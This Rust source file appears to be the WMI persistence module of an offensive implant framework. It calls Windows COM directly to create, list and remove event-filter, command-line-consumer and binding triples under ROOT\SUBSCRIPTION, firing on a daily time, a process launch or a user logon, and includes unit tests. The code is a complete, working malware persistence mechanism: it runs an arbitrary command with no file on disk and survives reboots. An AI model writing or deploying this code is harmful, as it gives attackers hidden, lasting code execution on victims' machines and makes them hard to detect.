//! The WMI repository edge (the module's whole platform surface): the
//! subscription triple under `ROOT\SUBSCRIPTION` -- an event filter, a
//! command-line consumer, and the binding that joins them -- created,
//! deleted, and read through the WMI COM interfaces directly, so the
//! module owes the loader no dependency beyond ole32 and oleaut32. The
//! interface layouts below follow the platform's own header the
//! windows-gnu build compiles against, slot for slot. Everything that
//! must hold for a test (the trigger templates, the reference reader,
//! the error table) is a plain function this host runs anywhere; only
//! the COM calls themselves sit behind `cfg(windows)`, and the Windows
//! crosses the CI lane builds prove they compile.
//!
//! Two repository facts shape the verb's honesty. Writing the triple
//! needs the administrator's access -- PutInstance and DeleteInstance
//! under ROOT\SUBSCRIPTION are the manager's calls -- and a seat lives
//! entirely in the repository: the module drops no file of its own,
//! and the seat survives reboots because the repository does.

/// The namespace the seats live in, and the one their queries watch.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) const ROOT_SUBSCRIPTION: &str = r"ROOT\SUBSCRIPTION";
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) const ROOT_CIMV2: &str = r"root\cimv2";

/// The WQL a trigger names, as the query the repository stores. The
/// three forms are the seat's when-fires knob, and each is one token:
/// a clock time, an image name, or the logon word. An exotic query a
/// form cannot say is the module's later widening, not v1.0's surface
/// -- the grammar's wire shape only survives while every slot between
/// the action and the trailing command is token-shaped.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn trigger_query(trigger: &str) -> Result<String, String> {
    if trigger.eq_ignore_ascii_case("logon") {
        return Ok("SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE \
             TargetInstance ISA 'Win32_LogonSession' AND \
             TargetInstance.LogonType = 2"
            .to_string());
    }
    if let Some(clock) = trigger.strip_prefix("daily:") {
        let (hours, minutes) = clock
            .split_once(':')
            .ok_or_else(|| unknown_trigger(trigger))?;
        if hours.len() != 2
            || minutes.len() != 2
            || !hours.bytes().all(|b| b.is_ascii_digit())
            || !minutes.bytes().all(|b| b.is_ascii_digit())
        {
            return Err(unknown_trigger(trigger));
        }
        let hours: u32 = hours.parse().expect("digits checked");
        let minutes: u32 = minutes.parse().expect("digits checked");
        if hours > 23 || minutes > 59 {
            return Err(unknown_trigger(trigger));
        }
        return Ok(format!(
            "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE \
             TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = {hours} \
             AND TargetInstance.Minute = {minutes}"
        ));
    }
    if let Some(image) = trigger.strip_prefix("process:") {
        // WQL quotes the image name; a name that cannot sit inside
        // quotes safely refuses rather than half-binding.
        if image.is_empty()
            || image.contains('\'')
            || image.contains('"')
            || image.contains(char::is_whitespace)
        {
            return Err(unknown_trigger(trigger));
        }
        return Ok(format!(
            "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE \
             TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '{image}'"
        ));
    }
    Err(unknown_trigger(trigger))
}

/// The refusal every unknown or malformed trigger reads: the token as
/// the operator typed it, then the three forms that exist.
fn unknown_trigger(trigger: &str) -> String {
    format!(
        "persist.wmi: unknown trigger '{trigger}' (the trigger forms are: \
         daily:HH:MM, process:<image name>, logon)"
    )
}

/// The seat name a reference carries: the quoted tail of an object
/// path (`__EventFilter.Name="SeatA"` reads `SeatA`). A path without
/// quotes stands as itself -- the reader guesses nothing.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn ref_name(reference: &str) -> String {
    match (reference.find('"'), reference.rfind('"')) {
        (Some(start), Some(end)) if end > start => reference[start + 1..end].to_string(),
        _ => reference.to_string(),
    }
}

/// The HRESULT codes the three actions can meet, as the messages the
/// operator reads. A code outside the table stands as its number --
/// never a guess at what the site's repository meant by it.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn status_message(status: i32) -> String {
    match status as u32 {
        0x8007_0005 => "access denied (WMI seats need an elevated implant)".to_string(),
        0x8004_1002 => "the object does not exist".to_string(),
        other => format!("wmi error 0x{other:08X}"),
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    use super::{ref_name, ROOT_CIMV2, ROOT_SUBSCRIPTION};

    /// One listed seat: the filter's name, the query it watches, and
    /// the command its consumer runs -- the bound triple as it sits.
    pub(crate) struct Seat {
        pub name: String,
        pub query: String,
        pub command: String,
    }

    type Hresult = i32;
    /// The automation string the interfaces take: a pointer to
    /// length-prefixed UTF-16 the module allocates and frees itself.
    type Bstr = *mut u16;

    const S_OK: Hresult = 0;
    const S_FALSE: Hresult = 1;
    const RPC_E_CHANGED_MODE: Hresult = 0x8001_0106u32 as i32;
    const WBEM_E_NOT_FOUND: Hresult = 0x8004_1002u32 as i32;

    const COINIT_MULTITHREADED: u32 = 0;
    const CLSCTX_INPROC_SERVER: u32 = 1;
    const RPC_C_AUTHN_WINNT: u32 = 10;
    const RPC_C_AUTHZ_NONE: u32 = 0;
    const RPC_C_AUTHN_LEVEL_CALL: u32 = 3;
    const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 4;
    const EOAC_NONE: u32 = 0;

    const VT_BSTR: u16 = 8;
    const WBEM_FLAG_CREATE_OR_UPDATE: i32 = 0;
    const WBEM_FLAG_FORWARD_ONLY: i32 = 0x20;
    const WBEM_INFINITE: i32 = -1;

    #[repr(C)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    const CLSID_WBEM_LOCATOR: Guid = Guid {
        data1: 0x4590_f811,
        data2: 0x1d3a,
        data3: 0x11d0,
        data4: [0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };
    const IID_IWBM_LOCATOR: Guid = Guid {
        data1: 0xdc12_a687,
        data2: 0x737f,
        data3: 0x11cf,
        data4: [0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };

    /// The COM VARIANT the property calls carry. The record is 24
    /// bytes on every target the module claims; the module only ever
    /// holds a BSTR in it, and the tail keeps the size the API owns.
    #[repr(C)]
    struct Variant {
        vt: u16,
        reserved: [u16; 3],
        bstr_value: Bstr,
        tail: [u8; 8],
    }

    // The interfaces, laid out slot for slot against the platform's
    // own header: every slot before the highest one the module calls
    // is declared, the untouched ones standing as bare pointers. All
    // four share the IUnknown head, so Release is one function for
    // every interface pointer the module holds.
    #[repr(C)]
    struct UnknownVtbl {
        query_interface: *const c_void,
        add_ref: *const c_void,
        release: unsafe extern "system" fn(this: *mut c_void) -> u32,
    }

    #[repr(C)]
    struct LocatorVtbl {
        unknown: UnknownVtbl,
        connect_server: unsafe extern "system" fn(
            this: *mut c_void,
            resource: Bstr,
            user: Bstr,
            password: Bstr,
            locale: Bstr,
            security_flags: i32,
            authority: Bstr,
            context: *mut c_void,
            services: *mut *mut c_void,
        ) -> Hresult,
    }

    #[repr(C)]
    struct ServicesVtbl {
        unknown: UnknownVtbl,
        open_namespace: *const c_void,
        cancel_async_call: *const c_void,
        query_object_sink: *const c_void,
        get_object: unsafe extern "system" fn(
            this: *mut c_void,
            path: Bstr,
            flags: i32,
            context: *mut c_void,
            object: *mut *mut c_void,
            call_result: *mut *mut c_void,
        ) -> Hresult,
        get_object_async: *const c_void,
        put_class: *const c_void,
        put_class_async: *const c_void,
        delete_class: *const c_void,
        delete_class_async: *const c_void,
        create_class_enum: *const c_void,
        create_class_enum_async: *const c_void,
        put_instance: unsafe extern "system" fn(
            this: *mut c_void,
            instance: *mut c_void,
            flags: i32,
            context: *mut c_void,
            call_result: *mut *mut c_void,
        ) -> Hresult,
        put_instance_async: *const c_void,
        delete_instance: unsafe extern "system" fn(
            this: *mut c_void,
            path: Bstr,
            flags: i32,
            context: *mut c_void,
            call_result: *mut *mut c_void,
        ) -> Hresult,
        delete_instance_async: *const c_void,
        create_instance_enum: *const c_void,
        create_instance_enum_async: *const c_void,
        exec_query: unsafe extern "system" fn(
            this: *mut c_void,
            language: Bstr,
            query: Bstr,
            flags: i32,
            context: *mut c_void,
            enumerator: *mut *mut c_void,
        ) -> Hresult,
    }

    #[repr(C)]
    struct EnumVtbl {
        unknown: UnknownVtbl,
        reset: *const c_void,
        next: unsafe extern "system" fn(
            this: *mut c_void,
            timeout: i32,
            count: u32,
            objects: *mut *mut c_void,
            returned: *mut u32,
        ) -> Hresult,
        next_async: *const c_void,
        clone: *const c_void,
        skip: *const c_void,
    }

    #[repr(C)]
    struct ClassObjectVtbl {
        unknown: UnknownVtbl,
        get_qualifier_set: *const c_void,
        get: unsafe extern "system" fn(
            this: *mut c_void,
            name: *const u16,
            flags: i32,
            value: *mut Variant,
            type_: *mut i32,
            flavor: *mut i32,
        ) -> Hresult,
        put: unsafe extern "system" fn(
            this: *mut c_void,
            name: *const u16,
            flags: i32,
            value: *mut Variant,
            type_: i32,
        ) -> Hresult,
        delete: *const c_void,
        get_names: *const c_void,
        begin_enumeration: *const c_void,
        next: *const c_void,
        end_enumeration: *const c_void,
        get_property_qualifier_set: *const c_void,
        clone: *const c_void,
        get_object_text: *const c_void,
        spawn_derived_class: *const c_void,
        spawn_instance: unsafe extern "system" fn(
            this: *mut c_void,
            flags: i32,
            instance: *mut *mut c_void,
        ) -> Hresult,
    }

    #[link(name = "ole32")]
    extern "system" {
        fn CoInitializeEx(reserved: *mut c_void, coinit: u32) -> Hresult;
        fn CoUninitialize();
        fn CoCreateInstance(
            clsid: *const Guid,
            outer: *mut c_void,
            cls_context: u32,
            riid: *const Guid,
            out: *mut *mut c_void,
        ) -> Hresult;
        fn CoSetProxyBlanket(
            proxy: *mut c_void,
            authn_service: u32,
            authz_service: u32,
            server_principal: *const u16,
            authn_level: u32,
            impersonation_level: u32,
            auth_info: *mut c_void,
            capabilities: u32,
        ) -> Hresult;
    }

    #[link(name = "oleaut32")]
    extern "system" {
        fn SysAllocStringLen(text: *const u16, characters: u32) -> Bstr;
        fn SysFreeString(bstr: Bstr);
        fn VariantClear(variant: *mut Variant) -> Hresult;
    }

    /// A NUL-terminated UTF-16 string, the encoding the property names
    /// take.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// An owned automation string; every call site frees what it
    /// allocated.
    fn bstr_of(text: &str) -> Bstr {
        let units: Vec<u16> = text.encode_utf16().collect();
        unsafe { SysAllocStringLen(units.as_ptr(), units.len() as u32) }
    }

    /// An automation string the repository wrote, read to its NUL.
    fn from_bstr(bstr: Bstr) -> String {
        if bstr.is_null() {
            return String::new();
        }
        let mut units = Vec::new();
        let mut cursor = bstr;
        unsafe {
            while *cursor != 0 {
                units.push(*cursor);
                cursor = cursor.add(1);
            }
        }
        String::from_utf16_lossy(&units)
    }

    unsafe fn release(interface: *mut c_void) {
        let vtable = &**(interface as *const *const UnknownVtbl);
        (vtable.release)(interface);
    }

    /// The session every action rides: COM joined, the locator spent,
    /// a services proxy on the subscription namespace with the blanket
    /// every WMI client sets. Dropping it releases in reverse order.
    pub(crate) struct Session {
        services: *mut c_void,
        com_owned: bool,
    }

    impl Session {
        pub(crate) fn connect() -> Result<Session, i32> {
            unsafe {
                let hr = CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
                let com_owned = hr == S_OK || hr == S_FALSE;
                // The loader's thread may have chosen an apartment
                // already; WMI works in either, and the session rides
                // the thread's own without owning it. Any other
                // refusal is the connection's own failure.
                if !com_owned && hr != RPC_E_CHANGED_MODE {
                    return Err(hr);
                }

                let mut locator: *mut c_void = std::ptr::null_mut();
                let hr = CoCreateInstance(
                    &CLSID_WBEM_LOCATOR,
                    std::ptr::null_mut(),
                    CLSCTX_INPROC_SERVER,
                    &IID_IWBM_LOCATOR,
                    &mut locator,
                );
                if hr != S_OK {
                    if com_owned {
                        CoUninitialize();
                    }
                    return Err(hr);
                }

                let namespace = bstr_of(ROOT_SUBSCRIPTION);
                let mut services: *mut c_void = std::ptr::null_mut();
                let hr = ((&*(*(locator as *const *const LocatorVtbl))).connect_server)(
                    locator,
                    namespace,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    &mut services,
                );
                SysFreeString(namespace);
                release(locator);
                if hr != S_OK {
                    if com_owned {
                        CoUninitialize();
                    }
                    return Err(hr);
                }

                let hr = CoSetProxyBlanket(
                    services,
                    RPC_C_AUTHN_WINNT,
                    RPC_C_AUTHZ_NONE,
                    std::ptr::null(),
                    RPC_C_AUTHN_LEVEL_CALL,
                    RPC_C_IMP_LEVEL_IMPERSONATE,
                    std::ptr::null_mut(),
                    EOAC_NONE,
                );
                if hr != S_OK {
                    release(services);
                    if com_owned {
                        CoUninitialize();
                    }
                    return Err(hr);
                }

                Ok(Session {
                    services,
                    com_owned,
                })
            }
        }

        /// Creates the seat: filter, consumer, binding, all under the
        /// one name. CREATE_OR_UPDATE is the registry's own overwrite
        /// semantics -- installing over a seat retargets it -- and the
        /// binding goes last, so a half-written seat never fires.
        pub(crate) fn install_seat(
            &self,
            name: &str,
            query: &str,
            command: &str,
        ) -> Result<(), i32> {
            let filter = self.instance_of("__EventFilter")?;
            self.put_string(filter, "Name", name)?;
            self.put_string(filter, "Query", query)?;
            self.put_string(filter, "QueryLanguage", "WQL")?;
            self.put_string(filter, "EventNamespace", ROOT_CIMV2)?;
            let written = self.save(filter);
            unsafe { release(filter) };
            written?;

            let consumer = self.instance_of("CommandLineEventConsumer")?;
            self.put_string(consumer, "Name", name)?;
            self.put_string(consumer, "CommandLineTemplate", command)?;
            let written = self.save(consumer);
            unsafe { release(consumer) };
            written?;

            let binding = self.instance_of("__FilterToConsumerBinding")?;
            self.put_string(
                binding,
                "Filter",
                &format!(r#"__EventFilter.Name="{name}""#),
            )?;
            self.put_string(
                binding,
                "Consumer",
                &format!(r#"CommandLineEventConsumer.Name="{name}""#),
            )?;
            let written = self.save(binding);
            unsafe { release(binding) };
            written
        }

        /// Deletes the triple the name carries: the bindings first (a
        /// live binding keeps the pair executing while the parts go),
        /// then the consumer and the filter. A part that is already
        /// absent is not a failure -- the answer names the parts the
        /// removal took, and a seat with no part anywhere refuses.
        pub(crate) fn remove_seat(&self, name: &str) -> Result<Vec<&'static str>, i32> {
            let mut removed = Vec::new();

            let bindings = self.query("SELECT * FROM __FilterToConsumerBinding")?;
            for binding in bindings {
                let filter = self.get_string(binding, "Filter").unwrap_or_default();
                let consumer = self.get_string(binding, "Consumer").unwrap_or_default();
                let owns = ref_name(&filter).eq_ignore_ascii_case(name)
                    || ref_name(&consumer).eq_ignore_ascii_case(name);
                if owns {
                    if let Ok(path) = self.get_string(binding, "__RELPATH") {
                        if self.delete(&path).is_ok() {
                            removed.push("binding");
                        }
                    }
                }
                unsafe { release(binding) };
            }

            for (path, part) in [
                (
                    format!(r#"CommandLineEventConsumer.Name="{name}""#),
                    "consumer",
                ),
                (format!(r#"__EventFilter.Name="{name}""#), "filter"),
            ] {
                match self.delete(&path) {
                    Ok(()) => removed.push(part),
                    Err(WBEM_E_NOT_FOUND) => {}
                    Err(other) => return Err(other),
                }
            }

            if removed.is_empty() {
                return Err(WBEM_E_NOT_FOUND);
            }
            Ok(removed)
        }

        /// Every bound subscription in the repository: one seat per
        /// binding, its filter's query and its consumer's command read
        /// back from the objects the binding names. A side that will
        /// not open says so in its row -- one withheld part never kills
        /// the sweep of the whole repository.
        pub(crate) fn list_seats(&self) -> Result<Vec<Seat>, i32> {
            let bindings = self.query("SELECT * FROM __FilterToConsumerBinding")?;
            let mut seats = Vec::new();
            for binding in bindings {
                let filter = self.get_string(binding, "Filter").unwrap_or_default();
                let consumer = self.get_string(binding, "Consumer").unwrap_or_default();
                unsafe { release(binding) };

                let query = match self.open(&filter) {
                    Ok(object) => {
                        let query = self
                            .get_string(object, "Query")
                            .ok()
                            .filter(|query| !query.is_empty());
                        unsafe { release(object) };
                        query.unwrap_or_else(|| "(filter not readable)".to_string())
                    }
                    Err(_) => "(filter not readable)".to_string(),
                };
                let command = match self.open(&consumer) {
                    Ok(object) => {
                        let command = self
                            .get_string(object, "CommandLineTemplate")
                            .ok()
                            .filter(|command| !command.is_empty())
                            .or_else(|| {
                                self.get_string(object, "ExecutablePath")
                                    .ok()
                                    .filter(|command| !command.is_empty())
                            });
                        unsafe { release(object) };
                        command.unwrap_or_else(|| "(no command line)".to_string())
                    }
                    Err(_) => "(consumer not readable)".to_string(),
                };
                seats.push(Seat {
                    name: ref_name(&filter),
                    query,
                    command,
                });
            }
            Ok(seats)
        }

        /// A blank instance of a class, the only shape a new seat is
        /// written through.
        fn instance_of(&self, class: &str) -> Result<*mut c_void, i32> {
            let object = self.open(class)?;
            let mut instance: *mut c_void = std::ptr::null_mut();
            let hr = unsafe {
                ((&*(*(object as *const *const ClassObjectVtbl))).spawn_instance)(
                    object,
                    0,
                    &mut instance,
                )
            };
            unsafe { release(object) };
            (hr == S_OK && !instance.is_null())
                .then_some(instance)
                .ok_or(hr)
        }

        /// The object a path names, or the class a bare class name
        /// names.
        fn open(&self, path: &str) -> Result<*mut c_void, i32> {
            let path_bstr = bstr_of(path);
            let mut object: *mut c_void = std::ptr::null_mut();
            let hr = unsafe {
                ((&*(*(self.services as *const *const ServicesVtbl))).get_object)(
                    self.services,
                    path_bstr,
                    0,
                    std::ptr::null_mut(),
                    &mut object,
                    std::ptr::null_mut(),
                )
            };
            unsafe { SysFreeString(path_bstr) };
            (hr == S_OK && !object.is_null())
                .then_some(object)
                .ok_or(hr)
        }

        /// Writes an instance under CREATE_OR_UPDATE.
        fn save(&self, instance: *mut c_void) -> Result<(), i32> {
            let hr = unsafe {
                ((&*(*(self.services as *const *const ServicesVtbl))).put_instance)(
                    self.services,
                    instance,
                    WBEM_FLAG_CREATE_OR_UPDATE,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                )
            };
            (hr == S_OK).then_some(()).ok_or(hr)
        }

        /// Deletes the object a relative path names.
        fn delete(&self, path: &str) -> Result<(), i32> {
            let path_bstr = bstr_of(path);
            let hr = unsafe {
                ((&*(*(self.services as *const *const ServicesVtbl))).delete_instance)(
                    self.services,
                    path_bstr,
                    0,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                )
            };
            unsafe { SysFreeString(path_bstr) };
            (hr == S_OK).then_some(()).ok_or(hr)
        }

        /// Every object a query answers, the enumerator spent before
        /// the answer returns.
        fn query(&self, text: &str) -> Result<Vec<*mut c_void>, i32> {
            let language = bstr_of("WQL");
            let query = bstr_of(text);
            let mut enumerator: *mut c_void = std::ptr::null_mut();
            let hr = unsafe {
                ((&*(*(self.services as *const *const ServicesVtbl))).exec_query)(
                    self.services,
                    language,
                    query,
                    WBEM_FLAG_FORWARD_ONLY,
                    std::ptr::null_mut(),
                    &mut enumerator,
                )
            };
            unsafe { SysFreeString(language) };
            unsafe { SysFreeString(query) };
            if hr != S_OK || enumerator.is_null() {
                return Err(hr);
            }

            let mut objects = Vec::new();
            loop {
                let mut object: *mut c_void = std::ptr::null_mut();
                let mut returned: u32 = 0;
                let hr = unsafe {
                    ((&*(*(enumerator as *const *const EnumVtbl))).next)(
                        enumerator,
                        WBEM_INFINITE,
                        1,
                        &mut object,
                        &mut returned,
                    )
                };
                if hr != S_OK || returned == 0 {
                    break;
                }
                objects.push(object);
            }
            unsafe { release(enumerator) };
            Ok(objects)
        }

        /// Puts one string property onto an instance.
        fn put_string(&self, object: *mut c_void, name: &str, value: &str) -> Result<(), i32> {
            let value = bstr_of(value);
            let mut variant: Variant = Variant {
                vt: VT_BSTR,
                reserved: [0; 3],
                bstr_value: value,
                tail: [0; 8],
            };
            let hr = unsafe {
                ((&*(*(object as *const *const ClassObjectVtbl))).put)(
                    object,
                    wide(name).as_ptr(),
                    0,
                    &mut variant,
                    0,
                )
            };
            unsafe { SysFreeString(value) };
            (hr == S_OK).then_some(()).ok_or(hr)
        }

        /// Reads one string property off an object, an owned copy, the
        /// variant cleared.
        fn get_string(&self, object: *mut c_void, name: &str) -> Result<String, i32> {
            let mut variant: Variant = unsafe { std::mem::zeroed() };
            let hr = unsafe {
                ((&*(*(object as *const *const ClassObjectVtbl))).get)(
                    object,
                    wide(name).as_ptr(),
                    0,
                    &mut variant,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                )
            };
            if hr != S_OK {
                return Err(hr);
            }
            let text = from_bstr(variant.bstr_value);
            unsafe { VariantClear(&mut variant) };
            Ok(text)
        }
    }

    impl Drop for Session {
        fn drop(&mut self) {
            unsafe {
                release(self.services);
                if self.com_owned {
                    CoUninitialize();
                }
            }
        }
    }
}

#[cfg(windows)]
pub(crate) use win::Session;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_trigger_templates_name_the_queries_they_build() {
        // Logon: every interactive logon.
        assert!(
            trigger_query("logon")
                .unwrap()
                .contains("Win32_LogonSession"),
            "{}",
            trigger_query("logon").unwrap()
        );
        assert!(
            trigger_query("LOGON").unwrap().contains("LogonType = 2"),
            "{}",
            trigger_query("LOGON").unwrap()
        );

        // Daily: the clock time rides into the LocalTime query.
        let daily = trigger_query("daily:09:30").unwrap();
        assert!(daily.contains("Win32_LocalTime"), "{daily}");
        assert!(daily.contains("Hour = 9"), "{daily}");
        assert!(daily.contains("Minute = 30"), "{daily}");

        // Process: the image name rides in, quoted.
        let process = trigger_query("process:notepad.exe").unwrap();
        assert!(process.contains("Win32_Process"), "{process}");
        assert!(process.contains("Name = 'notepad.exe'"), "{process}");
    }

    #[test]
    fn triggers_the_templates_cannot_say_refuse_naming_the_forms() {
        for trigger in [
            "daily",
            "daily:9:30",
            "daily:099:30",
            "daily:24:00",
            "daily:09:60",
            "daily:09",
            "process:",
            "process:two words.exe",
            "process:it's.exe",
            "process:quote\".exe",
            "usb",
        ] {
            let refusal = trigger_query(trigger).unwrap_err();
            assert!(
                refusal.contains(&format!("unknown trigger '{trigger}'")),
                "{refusal}"
            );
            assert!(
                refusal.contains("daily:HH:MM, process:<image name>, logon"),
                "{refusal}"
            );
        }
    }

    #[test]
    fn the_reference_reader_takes_the_quoted_tail() {
        assert_eq!(ref_name(r#"__EventFilter.Name="SeatA""#), "SeatA");
        assert_eq!(
            ref_name(r#"CommandLineEventConsumer.Name="Seat B""#),
            "Seat B"
        );
        // A path without quotes stands as itself.
        assert_eq!(ref_name("__EventFilter"), "__EventFilter");
    }

    #[test]
    fn the_status_table_names_the_codes_operators_meet() {
        assert!(
            status_message(0x8007_0005u32 as i32).contains("elevated"),
            "{}",
            status_message(0x8007_0005u32 as i32)
        );
        assert_eq!(
            status_message(0x8004_1002u32 as i32),
            "the object does not exist"
        );
        // An untabled code keeps its number -- never a guessed cause.
        assert_eq!(status_message(3), "wmi error 0x00000003");
    }
}
